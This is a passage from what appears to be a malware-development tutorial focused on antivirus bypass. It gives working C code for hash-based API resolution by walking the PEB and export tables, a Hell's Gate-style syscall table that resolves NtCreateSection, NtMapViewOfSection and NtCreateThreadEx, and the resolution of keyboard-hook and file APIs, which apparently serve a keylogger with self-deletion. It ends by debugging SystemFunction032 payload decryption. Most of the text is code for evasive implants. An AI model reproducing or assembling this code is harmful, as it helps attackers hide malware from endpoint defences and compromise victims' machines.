	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgExportDir<span class="token operator">-&gt;</span>NumberOfFunctions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		CHAR<span class="token operator">*</span> pFunctionName <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		PVOID	pFunctionAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> FunctionAddressArray<span class="token punctuation">[</span>FunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Hashing every function name `pFunctionName`</span>
		<span class="token comment">// If both hashes are equal, then we found the function we want </span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>dwApiNameHash <span class="token operator">==</span> <span class="token function">HASHA</span><span class="token punctuation">(</span>pFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> pFunctionAddress<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

HMODULE <span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>DWORD dwModuleNameHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwModuleNameHash <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_WIN64</span></span>
	PPEB			pPeb <span class="token operator">=</span> <span class="token punctuation">(</span>PEB<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">elif</span> <span class="token expression">_WIN32</span></span>
	PPEB			pPeb <span class="token operator">=</span> <span class="token punctuation">(</span>PEB<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">__readfsdword</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

	PPEB_LDR_DATA		    pLdr <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB_LDR_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeb<span class="token operator">-&gt;</span>Ldr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	PLDR_DATA_TABLE_ENTRY	pDte <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pLdr<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>pDte<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Length <span class="token operator">&lt;</span> MAX_PATH<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token comment">// Converting `FullDllName.Buffer` to upper case string </span>
			CHAR UpperCaseDllName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span><span class="token punctuation">;</span>

			DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				UpperCaseDllName<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token punctuation">)</span><span class="token function">toupper</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				i<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			UpperCaseDllName<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>

			<span class="token comment">// Hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">HASHA</span><span class="token punctuation">(</span>UpperCaseDllName<span class="token punctuation">)</span> <span class="token operator">==</span> dwModuleNameHash<span class="token punctuation">)</span>
				<span class="token keyword">return</span> <span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>InInitializationOrderLinks<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		pDte <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-20">Header File</h4>
<p>Before continuing, a new header file, <code>typedef.h</code>, should be created to define the used WinAPIs as function pointers for clarity and maintainability. <code>Common.h</code> will need to include the <code>typedef.h</code> header file using <code>#include "typedef.h"</code>.</p>
<p><strong>typedef.h</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>


<span class="token keyword">typedef</span> <span class="token function">ULONGLONG</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnGetTickCount64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">HANDLE</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnOpenProcess<span class="token punctuation">)</span><span class="token punctuation">(</span>DWORD dwDesiredAccess<span class="token punctuation">,</span> BOOL bInheritHandle<span class="token punctuation">,</span> DWORD dwProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">LRESULT</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnCallNextHookEx<span class="token punctuation">)</span><span class="token punctuation">(</span>HHOOK hhk<span class="token punctuation">,</span> <span class="token keyword">int</span> nCode<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">HHOOK</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnSetWindowsHookExW<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span> idHook<span class="token punctuation">,</span> HOOKPROC lpfn<span class="token punctuation">,</span> HINSTANCE hmod<span class="token punctuation">,</span> DWORD dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">BOOL</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnGetMessageW<span class="token punctuation">)</span><span class="token punctuation">(</span>LPMSG lpMsg<span class="token punctuation">,</span> HWND hWnd<span class="token punctuation">,</span> UINT wMsgFilterMin<span class="token punctuation">,</span> UINT wMsgFilterMax<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">LRESULT</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnDefWindowProcW<span class="token punctuation">)</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT Msg<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">BOOL</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnUnhookWindowsHookEx<span class="token punctuation">)</span><span class="token punctuation">(</span>HHOOK hhk<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">DWORD</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnGetModuleFileNameW<span class="token punctuation">)</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> LPWSTR lpFilename<span class="token punctuation">,</span> DWORD nSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">HANDLE</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnCreateFileW<span class="token punctuation">)</span><span class="token punctuation">(</span>LPCWSTR lpFileName<span class="token punctuation">,</span> DWORD dwDesiredAccess<span class="token punctuation">,</span> DWORD dwShareMode<span class="token punctuation">,</span> LPSECURITY_ATTRIBUTES lpSecurityAttributes<span class="token punctuation">,</span> DWORD dwCreationDisposition<span class="token punctuation">,</span> DWORD dwFlagsAndAttributes<span class="token punctuation">,</span> HANDLE hTemplateFile<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">BOOL</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnSetFileInformationByHandle<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE hFile<span class="token punctuation">,</span> FILE_INFO_BY_HANDLE_CLASS FileInformationClass<span class="token punctuation">,</span> LPVOID lpFileInformation<span class="token punctuation">,</span> DWORD dwBufferSize<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">BOOL</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> fnCloseHandle<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-21">API_HASHING Structure</h4>
<p>Next, a new structure <code>API_HASHING</code> is defined in <code>Common.h</code> and is used to store the addresses of WinAPIs used, making them more accessible for use within the implementation's functions.</p>
<p><strong>Common.h</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_API_HASHING</span> <span class="token punctuation">{</span>

	fnGetTickCount64                pGetTickCount64<span class="token punctuation">;</span>
	fnOpenProcess                   pOpenProcess<span class="token punctuation">;</span>
	fnCallNextHookEx                pCallNextHookEx<span class="token punctuation">;</span>
	fnSetWindowsHookExW             pSetWindowsHookExW<span class="token punctuation">;</span>
	fnGetMessageW                   pGetMessageW<span class="token punctuation">;</span>
	fnDefWindowProcW                pDefWindowProcW<span class="token punctuation">;</span>
	fnUnhookWindowsHookEx           pUnhookWindowsHookEx<span class="token punctuation">;</span>
	fnGetModuleFileNameW            pGetModuleFileNameW<span class="token punctuation">;</span>
	fnCreateFileW                   pCreateFileW<span class="token punctuation">;</span>
	fnSetFileInformationByHandle    pSetFileInformationByHandle<span class="token punctuation">;</span>
	fnCloseHandle                   pCloseHandle<span class="token punctuation">;</span>

<span class="token punctuation">}</span>API_HASHING<span class="token punctuation">,</span> <span class="token operator">*</span> PAPI_HASHING<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-22">Updating VX_Table</h4>
<p>The <code>GetModuleHandleH</code> and <code>GetProcAddressH</code> functions must be used to initialize the elements in the <code>API_HASHING</code> structure. The <code>InitializeSyscalls</code> function then uses these functions to initialize the <code>VX_TABLE</code> structure, which is used to call syscalls.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// ...</span>

API_HASHING g_Api <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>


BOOL <span class="token function">InitializeSyscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Get the PEB</span>
	PTEB pCurrentTeb <span class="token operator">=</span> <span class="token function">RtlGetThreadEnvironmentBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	PPEB pCurrentPeb <span class="token operator">=</span> pCurrentTeb<span class="token operator">-&gt;</span>ProcessEnvironmentBlock<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pCurrentPeb <span class="token operator">||</span> <span class="token operator">!</span>pCurrentTeb <span class="token operator">||</span> pCurrentPeb<span class="token operator">-&gt;</span>OSMajorVersion <span class="token operator">!=</span> <span class="token number">0xA</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Get NTDLL module </span>
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pCurrentPeb<span class="token operator">-&gt;</span>Ldr<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">.</span>Flink<span class="token operator">-&gt;</span>Flink <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get the EAT of NTDLL</span>
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetImageExportDirectory</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pImageExportDirectory<span class="token punctuation">)</span> <span class="token operator">||</span> pImageExportDirectory <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	g_Sys<span class="token punctuation">.</span>NtCreateSection<span class="token punctuation">.</span>uHash          <span class="token operator">=</span> NtCreateSection_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">.</span>uHash       <span class="token operator">=</span> NtMapViewOfSection_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtUnmapViewOfSection<span class="token punctuation">.</span>uHash     <span class="token operator">=</span> NtUnmapViewOfSection_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtClose<span class="token punctuation">.</span>uHash                  <span class="token operator">=</span> NtClose_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtCreateThreadEx<span class="token punctuation">.</span>uHash         <span class="token operator">=</span> NtCreateThreadEx_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtWaitForSingleObject<span class="token punctuation">.</span>uHash    <span class="token operator">=</span> NtWaitForSingleObject_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtQuerySystemInformation<span class="token punctuation">.</span>uHash <span class="token operator">=</span> NtQuerySystemInformation_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtDelayExecution<span class="token punctuation">.</span>uHash         <span class="token operator">=</span> NtDelayExecution_JOAA<span class="token punctuation">;</span>

	<span class="token comment">// Initialize the syscalls</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtCreateSection<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtUnmapViewOfSection<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtClose<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtCreateThreadEx<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtWaitForSingleObject<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtQuerySystemInformation<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> pImageExportDirectory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_Sys<span class="token punctuation">.</span>NtDelayExecution<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>


	<span class="token comment">//	User32.dll exported</span>
	g_Api<span class="token punctuation">.</span>pCallNextHookEx      <span class="token operator">=</span> <span class="token punctuation">(</span>fnCallNextHookEx<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>USER32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> CallNextHookEx_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pDefWindowProcW      <span class="token operator">=</span> <span class="token punctuation">(</span>fnDefWindowProcW<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>USER32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> DefWindowProcW_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pGetMessageW         <span class="token operator">=</span> <span class="token punctuation">(</span>fnGetMessageW<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>USER32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> GetMessageW_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pSetWindowsHookExW   <span class="token operator">=</span> <span class="token punctuation">(</span>fnSetWindowsHookExW<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>USER32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> SetWindowsHookExW_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pUnhookWindowsHookEx <span class="token operator">=</span> <span class="token punctuation">(</span>fnUnhookWindowsHookEx<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>USER32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> UnhookWindowsHookEx_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_Api<span class="token punctuation">.</span>pCallNextHookEx <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pDefWindowProcW <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pGetMessageW <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pSetWindowsHookExW <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pUnhookWindowsHookEx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// 	Kernel32.dll exported</span>
	g_Api<span class="token punctuation">.</span>pGetModuleFileNameW          <span class="token operator">=</span> <span class="token punctuation">(</span>fnGetModuleFileNameW<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>KERNEL32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> GetModuleFileNameW_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pCloseHandle                 <span class="token operator">=</span> <span class="token punctuation">(</span>fnCloseHandle<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>KERNEL32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> CloseHandle_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pCreateFileW                 <span class="token operator">=</span> <span class="token punctuation">(</span>fnCreateFileW<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>KERNEL32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> CreateFileW_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pGetTickCount64              <span class="token operator">=</span> <span class="token punctuation">(</span>fnGetTickCount64<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>KERNEL32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> GetTickCount64_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pOpenProcess                 <span class="token operator">=</span> <span class="token punctuation">(</span>fnOpenProcess<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>KERNEL32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> OpenProcess_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
	g_Api<span class="token punctuation">.</span>pSetFileInformationByHandle  <span class="token operator">=</span> <span class="token punctuation">(</span>fnSetFileInformationByHandle<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>KERNEL32DLL_JOAA<span class="token punctuation">)</span><span class="token punctuation">,</span> SetFileInformationByHandle_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_Api<span class="token punctuation">.</span>pGetModuleFileNameW <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pCloseHandle <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pCreateFileW <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pGetTickCount64 <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pOpenProcess <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> g_Api<span class="token punctuation">.</span>pSetFileInformationByHandle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The WinAPIs hashes are generated by the <code>Hasher</code> project as shown below.</p>
<p><img src="81_files/av-bypass-916815114-a9254939-9382-4dfe-8c32-54f871d9fc47.png" alt="image"></p>
<p>The next step is to utilize the <code>g_Api</code> structure to call all WinAPIs, by prefixing each one with <code>g_Api.&lt;WinAPI&gt;</code>, for example, <code>OpenProcess</code> should be called as <code>g_Api.pOpenProcess</code>.</p>
<h3 id="toc-heading-23">SystemFunction032 API Hashing Error</h3>
<p>While applying API hashing to the <code>SystemFunction032</code> function (that is not included in the <code>g_Api</code> structure) the following exception will occur.</p>
<p><img src="81_files/av-bypass-10.png" alt="image"></p>
<p>An exception is thrown when attempting to execute <code>SystemFunction032</code> at address <code>0x00007FFC42C09FF2</code>, which appears to be a valid address since it's being fetched using the line of code below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">fnSystemFunction032 SystemFunction032 <span class="token operator">=</span> <span class="token punctuation">(</span>fnSystemFunction032<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"Advapi32"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SystemFunction032_JOAA<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Use xdbg to check the address to understand the root of the problem.</p>
<p><img src="81_files/av-bypass-11.png" alt="image"></p>
<p><img src="81_files/av-bypass-12.png" alt="image"></p>
<h4 id="toc-heading-24">Forwarded Functions</h4>
